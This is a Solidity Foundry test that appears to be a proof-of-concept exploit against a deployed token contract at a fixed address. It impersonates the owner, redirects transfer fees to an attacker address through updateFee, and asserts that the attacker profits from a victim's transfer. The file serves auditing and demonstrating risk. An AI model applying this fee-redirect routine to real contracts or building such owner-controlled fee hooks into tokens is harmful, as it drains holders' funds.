// Merged the two ICoinToken interfaces into one and removed the duplicate.
interface ICoinToken {
    function owner() external view returns (address);
    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker = address(this);
    ICoinToken private token;
    address private victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ICoinToken(TARGET);
        victim = makeAddr("victim");
        deal(TARGET, victim, 1000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 attackerInitialBalance = token.balanceOf(attacker);

        // Identify the contract owner.
        address contractOwner = token.owner();

        // Create a new victim and fund it properly to ensure totalSupply is consistent,
        // avoiding the issue where `deal` creates unbacked tokens.
        address real_victim = makeAddr("real_victim");
        uint256 victimAmount = 1000 * 1e18;

        vm.startPrank(contractOwner);
        // 1. Owner sends tokens to the victim.
        token.transfer(real_victim, victimAmount);
        // 2. Owner sets the malicious fees.
        token.updateFee(50, 50, attacker);
        vm.stopPrank();

        // 3. The funded victim makes a transfer, triggering the fees.
        vm.startPrank(real_victim);
        token.transfer(makeAddr("recipient"), victimAmount);
        vm.stopPrank();

        // 4. Assert that the attacker profited.
        uint256 attackerFinalBalance = token.balanceOf(attacker);
        assertGt(attackerFinalBalance, attackerInitialBalance);
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

